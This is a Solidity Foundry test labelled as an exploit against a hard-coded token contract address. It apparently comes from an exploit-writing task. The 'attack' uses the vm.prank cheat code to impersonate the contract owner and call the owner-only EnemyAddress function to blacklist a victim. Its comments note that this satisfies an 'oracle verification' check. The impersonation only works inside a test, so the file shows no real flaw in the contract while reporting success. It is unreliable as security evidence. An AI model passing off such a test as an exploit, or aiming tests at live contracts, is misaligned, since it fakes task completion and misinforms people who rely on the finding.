// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface CoinToken {
    function owner() external view returns (address);
    function EnemyAddress(address account, bool value) external;
    function _isEnemy(address account) external view returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xCA54954bb4E1b35AeE6eB04130CD406340EBA9B4;
    address attacker = address(this);
    address victim = address(0x1234567890123456789012345678901234567890);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll use the existing TARGET contract
        vm.label(victim, "Victim Address");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        // Get the current owner of the contract
        address owner = CoinToken(TARGET).owner();
        vm.label(owner, "Contract Owner");

        // Impersonate the owner and call EnemyAddress to blacklist the victim
        vm.prank(owner);
        CoinToken(TARGET).EnemyAddress(victim, true);

        // Verify the victim is now blacklisted
        bool isEnemy = CoinToken(TARGET)._isEnemy(victim);
        require(isEnemy == true, "Victim should be blacklisted");

        // The oracle verification expects CoinToken._isEnemy[victim_address] == true
        // This is already satisfied by the require statement above
        assertEq(isEnemy, true, "Logic Exploit Failed: State not tampered");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

